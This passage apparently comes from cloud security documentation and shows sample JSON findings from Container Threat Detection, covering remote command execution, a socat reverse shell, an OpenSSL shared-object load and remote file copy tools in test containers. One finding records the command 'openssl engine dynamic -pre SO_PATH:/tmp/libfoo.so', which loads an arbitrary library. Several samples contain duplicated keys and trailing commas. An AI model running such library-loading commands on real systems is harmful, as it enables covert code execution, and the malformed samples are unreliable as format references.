          ],
          "additionalTechniques": [
            "MULTI_STAGE_CHANNELS"
          ]
        },
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "muteUpdateTime": "1970-01-01T00:00:00Z",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/locations/global",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "INTERPRETER",
              "size": "147176",
              "sha256": "INTERPRETER_SHA_256",
              "hashedSize": "147176",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "args": [
              "INTERPRETER",
              "ARG"
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"KUBERNETES_SERVICE_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"HOSTNAME\"",
                "val": "\"ktd-test-remote-cmd-exec-ba379a7c2168db11\""
              },
              {
                "name": "\"HOME\"",
                "val": "\"/root\""
              },
              {
                "name": "\"GPG_KEY\"",
                "val": "\"7169605F62C751356D054A26A821E680E5FA6305\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_ADDR\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"PATH\"",
                "val": "\"/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PROTO\"",
                "val": "\"tcp\""
              },
              {
                "name": "\"LANG\"",
                "val": "\"C.UTF-8\""
              },
              {
                "name": "\"PYTHON_VERSION\"",
                "val": "\"3.12.6\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_PORT_HTTPS\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_HOST\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"PWD\"",
                "val": "\"/\""
              }
            ],
            "pid": "9",
            "parentPid": "1"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "MEDIUM",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "displayName": "CLUSTER_ID",
        "type": "google.container.Cluster",
        "cloudProvider": "GOOGLE_CLOUD_PLATFORM",
        "service": "container.googleapis.com",
        "location": "ZONE",
        "gcpMetadata": {
          "project": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "projectDisplayName": "PROJECT_ID",
          "parent": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "parentDisplayName": "PROJECT_ID",
          "folders": [
            {
              "resourceFolder": "//cloudresourcemanager.googleapis.com/folders/FOLDER_NUMBER",
              "resourceFolderDisplayName": "FOLDER_ID"
            }
          ],
          "organization": "organizations/ORGANIZATION_ID"
        },
        "resourcePath": {
          "nodes": [
            {
              "nodeType": "GCP_PROJECT",
              "id": "projects/PROJECT_ID",
              "displayName": "PROJECT_ID"
            },
            {
              "nodeType": "GCP_FOLDER",
              "id": "folders/FOLDER_NUMBER",
              "displayName": "FOLDER_ID"
            },
            {
              "nodeType": "GCP_ORGANIZATION",
              "id": "organizations/ORGANIZATION_ID"
            }
          ]
        },
        "resourcePathString": "organizations/ORGANIZATION_ID/projects/PROJECT_ID"
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "ktd_possible_remote_command_execution_detected"
        },
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1729291973",
                "nanos": 687426149
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/techniques/T1059/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal File Link",
              "url": "https://www.virustotal.com/gui/file/0d06f9724af41b13cdacea133530b9129a48450230feef9632d53d5bbb837c8c/detection"
            }
          ],
          "relatedFindingUri": {}
        }
      },
    }
        

#### Execution: Program Run with Disallowed HTTP Proxy Env
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID",
        "category": "Execution: Program Run with Disallowed HTTP Proxy Env",
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_IMAGE_URI",
            "imageId": "CONTAINER_IMAGE_ID",
            "createTime": "2024-06-17T18:50:13Z"
          }
        ],
        "createTime": "2025-01-21T19:55:22.017Z",
        "database": {},
        "eventTime": "2025-01-21T19:55:21.762Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "NAMESPACE",
              "containers": [
                {
                  "name": "CONTAINER_NAME",
                  "uri": "CONTAINER_IMAGE_URI",
                  "imageId": "CONTAINER_IMAGE_ID",
                  "createTime": "2025-01-21T19:55:19Z"
                }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE_ID"
            }
          ]
        },
        "logEntries": [
          {
            "cloudLoggingEntry": {
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": "2025-01-21T19:55:19.654640277Z"
            }
          }
        ],
        "mitreAttack": {},
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "mitreAttack": {
          "primaryTactic": "PRIVILEGE_ESCALATION",
          "primaryTechniques": [
            "ESCAPE_TO_HOST"
          ]
        },
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "muteUpdateTime": "1970-01-01T00:00:00Z",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/locations/global",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "INTERPRETER",
              "size": "147176",
              "sha256": "INTERPRETER_SHA_256",
              "hashedSize": "147176",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "args": [
              "INTERPRETER",
              "ARG"
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"KUBERNETES_SERVICE_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"HOSTNAME\"",
                "val": "\"ktd-test-program-with-http-proxy-ba379a7c2168db11\""
              },
              {
                "name": "\"HOME\"",
                "val": "\"/root\""
              },
              {
                "name": "\"GPG_KEY\"",
                "val": "\"7169605F62C751356D054A26A821E680E5FA6305\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_ADDR\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"PATH\"",
                "val": "\"/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PROTO\"",
                "val": "\"tcp\""
              },
              {
                "name": "\"LANG\"",
                "val": "\"C.UTF-8\""
              },
              {
                "name": "\"PYTHON_VERSION\"",
                "val": "\"3.12.6\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_PORT_HTTPS\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_HOST\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"PWD\"",
                "val": "\"/\""
              },
              {
                "name": "\"HTTP_PROXY\"",
                "val": "\"http://localhost:8080\""
              }
            ],
            "pid": "9",
            "parentPid": "1"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "LOW",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "displayName": "CLUSTER_ID",
        "type": "google.container.Cluster",
        "cloudProvider": "GOOGLE_CLOUD_PLATFORM",
        "service": "container.googleapis.com",
        "location": "ZONE",
        "gcpMetadata": {
          "project": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "projectDisplayName": "PROJECT_ID",
          "parent": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "parentDisplayName": "PROJECT_ID",
          "folders": [
            {
              "resourceFolder": "//cloudresourcemanager.googleapis.com/folders/FOLDER_NUMBER",
              "resourceFolderDisplayName": "FOLDER_ID"
            }
          ],
          "organization": "organizations/ORGANIZATION_ID"
        },
        "resourcePath": {
          "nodes": [
            {
              "nodeType": "GCP_PROJECT",
              "id": "projects/PROJECT_ID",
              "displayName": "PROJECT_ID"
            },
            {
              "nodeType": "GCP_FOLDER",
              "id": "folders/FOLDER_NUMBER",
              "displayName": "FOLDER_ID"
            },
            {
              "nodeType": "GCP_ORGANIZATION",
              "id": "organizations/ORGANIZATION_ID"
            }
          ]
        },
        "resourcePathString": "organizations/ORGANIZATION_ID/projects/PROJECT_ID"
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "ktd_program_run_with_disallowed_http_proxy_env"
        },
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1729291973",
                "nanos": 687426149
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/techniques/T1204/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal File Link",
              "url": "https://www.virustotal.com/gui/file/f3bf59164816762430e8cdf5a5d64b4284a86af86245a52067c533c8cd98f215/detection"
            }
          ],
          "relatedFindingUri": {}
        }
      },
    }
        

#### Execution: Socat Reverse Shell Detected
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID",
        "category": "Execution: Socat Reverse Shell Detected",
        "chokepoint": {},
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_IMAGE_URI",
            "imageId": "CONTAINER_IMAGE_ID",
            "createTime": "2025-07-22T00:07:48Z"
          }
        ],
        "createTime": "2025-07-22T00:07:54.853Z",
        "database": {},
        "dataProtectionKeyGovernance": {},
        "eventTime": "2025-07-22T00:07:54.627Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "NAMESPACE",
              "containers": [
                {
                  "name": "CONTAINER_NAME",
                  "uri": "CONTAINER_IMAGE_URI",
                  "imageId": "CONTAINER_IMAGE_ID",
                  "createTime": "2025-01-21T19:55:19Z"
                }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE_ID"
            }
          ]
        },
        "logEntries": [
          {
            "cloudLoggingEntry": {
              "resourceContainer": "projects/770715367326",
              "timestamp": "2025-07-22T00:07:48.052030557Z"
            }
          }
        ],
        "mitreAttack": {
          "primaryTactic": "EXECUTION",
          "primaryTechniques": [
            "COMMAND_AND_SCRIPTING_INTERPRETER"
          ],
          "additionalTactics": [
            "COMMAND_AND_CONTROL"
          ],
          "additionalTechniques": [
            "MULTI_STAGE_CHANNELS"
          ]
        },
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "muteUpdateTime": "1970-01-01T00:00:00Z",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/locations/global",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "\"/usr/bin/bash\"",
              "size": "1446024",
              "sha256": "bc5945feb8bd26203ebfafea5ce1878bb2e32cb8fb50ab7ae395cfb1e1aaaef1",
              "hashedSize": "1446024",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "args": [
              "\"/bin/bash\""
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"_\"",
                "val": "\"/bin/sh\""
              },
              {
                "name": "\"HOSTNAME\"",
                "val": "\"ktd-test-cups-2025-07-22-00-07-44-utc\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PROTO\"",
                "val": "\"tcp\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_ADDR\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"KUBERNETES_PORT\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"PWD\"",
                "val": "\"/\""
              },
              {
                "name": "\"HOME\"",
                "val": "\"/root\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_PORT_HTTPS\"",
                "val": "\"443\""
              },
              {
                "name": "\"DEBIAN_FRONTEND\"",
                "val": "\"noninteractive\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"SHLVL\"",
                "val": "\"2\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"PATH\"",
                "val": "\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_HOST\"",
                "val": "\"34.118.224.1\""
              }
            ],
            "pid": "9",
            "parentPid": "8",
            "userId": "0"
          },
          {
            "binary": {
              "path": "\"/usr/bin/socat1\"",
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "argumentsTruncated": false,
            "pid": "0",
            "parentPid": "0",
            "userId": "0"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "CRITICAL",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "displayName": "CLUSTER_ID",
        "type": "google.container.Cluster",
        "cloudProvider": "GOOGLE_CLOUD_PLATFORM",
        "service": "container.googleapis.com",
        "location": "ZONE",
        "gcpMetadata": {
          "project": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "projectDisplayName": "PROJECT_ID",
          "parent": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "parentDisplayName": "PROJECT_ID",
          "folders": [
            {
              "resourceFolder": "//cloudresourcemanager.googleapis.com/folders/FOLDER_NUMBER",
              "resourceFolderDisplayName": "FOLDER_ID"
            }
          ],
          "organization": "organizations/ORGANIZATION_ID"
        },
        "resourcePath": {
          "nodes": [
            {
              "nodeType": "GCP_PROJECT",
              "id": "projects/PROJECT_ID",
              "displayName": "PROJECT_ID"
            },
            {
              "nodeType": "GCP_FOLDER",
              "id": "folders/FOLDER_NUMBER",
              "displayName": "FOLDER_ID"
            },
            {
              "nodeType": "GCP_ORGANIZATION",
              "id": "organizations/ORGANIZATION_ID"
            }
          ]
        },
        "resourcePathString": "organizations/ORGANIZATION_ID/projects/PROJECT_ID"
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "ktd_socat_reverse_shell_detected"
        },
        "detectionPriority": "CRITICAL",
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1729291973",
                "nanos": 687426149
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/tactics/TA0002/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal File Link",
              "url": "https://www.virustotal.com/gui/file/bc5945feb8bd26203ebfafea5ce1878bb2e32cb8fb50ab7ae395cfb1e1aaaef1/detection"
            }
          ],
          "relatedFindingUri": {}
        }
      }
    }
        

#### Execution: Suspicious OpenSSL Shared Object Loaded
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID",
        "category": "Execution: Suspicious OpenSSL Shared Object Loaded",
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_IMAGE_URI",
            "imageId": "CONTAINER_IMAGE_ID",
            "createTime": "2024-06-17T18:50:13Z"
          }
        ],
        "createTime": "2025-01-21T19:55:22.017Z",
        "database": {},
        "eventTime": "2025-01-21T19:55:21.762Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "NAMESPACE",
              "containers": [
                {
                  "name": "CONTAINER_NAME",
                  "uri": "CONTAINER_IMAGE_URI",
                  "imageId": "CONTAINER_IMAGE_ID",
                  "createTime": "2025-01-21T19:55:19Z"
                }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE_ID"
            }
          ]
        },
        "logEntries": [
          {
            "cloudLoggingEntry": {
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": "2025-01-21T19:55:19.654640277Z"
            }
          }
        ],
        "mitreAttack": {},
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "mitreAttack": {
          "primaryTactic": "EXECUTION",
          "primaryTechniques": [
            "SHARED_MODULES"
          ],
          "additionalTactics": [
            "PERSISTENCE"
          ]
        },
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "muteUpdateTime": "1970-01-01T00:00:00Z",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/locations/global",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "\"/usr/bin/openssl\"",
              "size": "736792",
              "sha256": "d3738c5257ede884644c633582fae65705399e0dd7e2dee70c4ecbba7af73469",
              "hashedSize": "736792",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "args": [
              "\"openssl\"",
              "\"engine\"",
              "\"dynamic\"",
              "\"-pre\"",
              "\"SO_PATH:/tmp/libfoo.so\""
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"HOSTNAME\"",
                "val": "\"CONTAINER_NAME\""
              },
            ],
            "pid": "9",
            "parentPid": "1"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "CRITICAL",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "displayName": "CLUSTER_ID",
        "type": "google.container.Cluster",
        "cloudProvider": "GOOGLE_CLOUD_PLATFORM",
        "service": "container.googleapis.com",
        "location": "ZONE",
        "gcpMetadata": {
          "project": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "projectDisplayName": "PROJECT_ID",
          "parent": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "parentDisplayName": "PROJECT_ID",
          "folders": [
            {
              "resourceFolder": "//cloudresourcemanager.googleapis.com/folders/FOLDER_NUMBER",
              "resourceFolderDisplayName": "FOLDER_ID"
            }
          ],
          "organization": "organizations/ORGANIZATION_ID"
        },
        "resourcePath": {
          "nodes": [
            {
              "nodeType": "GCP_PROJECT",
              "id": "projects/PROJECT_ID",
              "displayName": "PROJECT_ID"
            },
            {
              "nodeType": "GCP_FOLDER",
              "id": "folders/FOLDER_NUMBER",
              "displayName": "FOLDER_ID"
            },
            {
              "nodeType": "GCP_ORGANIZATION",
              "id": "organizations/ORGANIZATION_ID"
            }
          ]
        },
        "resourcePathString": "organizations/ORGANIZATION_ID/projects/PROJECT_ID"
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "ktd_suspicious_openssl_shared_object_loaded"
        },
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1729291973",
                "nanos": 687426149
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/tactics/TA0002/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal File Link",
              "url": "https://www.virustotal.com/gui/file/d3738c5257ede884644c633582fae65705399e0dd7e2dee70c4ecbba7af73469/detection"
            }
          ],
          "relatedFindingUri": {}
        }
      },
    }
        

#### Exfiltration: Launch Remote File Copy Tools in Container
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID",
        "category": "Exfiltration: Launch Remote File Copy Tools in Container",
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_IMAGE_URI",
            "imageId": "CONTAINER_IMAGE_ID",
            "createTime": "2024-06-17T18:50:13Z"
          }
        ],
        "createTime": "2025-01-21T19:55:22.017Z",
        "database": {},
        "eventTime": "2025-01-21T19:55:21.762Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "NAMESPACE",
              "containers": [
                {
                  "name": "CONTAINER_NAME",
                  "uri": "CONTAINER_IMAGE_URI",
                  "imageId": "CONTAINER_IMAGE_ID",
                  "createTime": "2025-01-21T19:55:19Z"
                }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE_ID"
            }
          ]
        },
        "logEntries": [
          {
            "cloudLoggingEntry": {
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": "2025-01-21T19:55:19.654640277Z"
            }
          }
        ],
        "mitreAttack": {},
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "mitreAttack": {
          "primaryTactic": "PRIVILEGE_ESCALATION",
          "primaryTechniques": [
            "ESCAPE_TO_HOST"
          ]
        },
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "muteUpdateTime": "1970-01-01T00:00:00Z",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/locations/global",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "INTERPRETER",
              "size": "147176",
              "sha256": "INTERPRETER_SHA_256",
              "hashedSize": "147176",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "args": [
              "INTERPRETER",
              "ARG"
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"KUBERNETES_SERVICE_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"HOSTNAME\"",
                "val": "\"ktd-test-launch-remote-file-copy-tools-ba379a7c2168db11\""
              },
              {
                "name": "\"HOME\"",
                "val": "\"/root\""
              },
              {
                "name": "\"GPG_KEY\"",
                "val": "\"7169605F62C751356D054A26A821E680E5FA6305\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_ADDR\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"PATH\"",
                "val": "\"/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PROTO\"",
                "val": "\"tcp\""
              },
              {
                "name": "\"LANG\"",
                "val": "\"C.UTF-8\""
              },
              {
                "name": "\"PYTHON_VERSION\"",
                "val": "\"3.12.6\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_PORT_HTTPS\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_HOST\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"PWD\"",
                "val": "\"/\""
              }
            ],
            "pid": "9",
            "parentPid": "1"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "LOW",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "displayName": "CLUSTER_ID",
        "type": "google.container.Cluster",
        "cloudProvider": "GOOGLE_CLOUD_PLATFORM",
        "service": "container.googleapis.com",
        "location": "ZONE",
        "gcpMetadata": {
          "project": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "projectDisplayName": "PROJECT_ID",
          "parent": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "parentDisplayName": "PROJECT_ID",
          "folders": [
            {
              "resourceFolder": "//cloudresourcemanager.googleapis.com/folders/FOLDER_NUMBER",
              "resourceFolderDisplayName": "FOLDER_ID"
            }
          ],
          "organization": "organizations/ORGANIZATION_ID"
        },
        "resourcePath": {
          "nodes": [
            {
              "nodeType": "GCP_PROJECT",
              "id": "projects/PROJECT_ID",
              "displayName": "PROJECT_ID"
            },
            {
              "nodeType": "GCP_FOLDER",
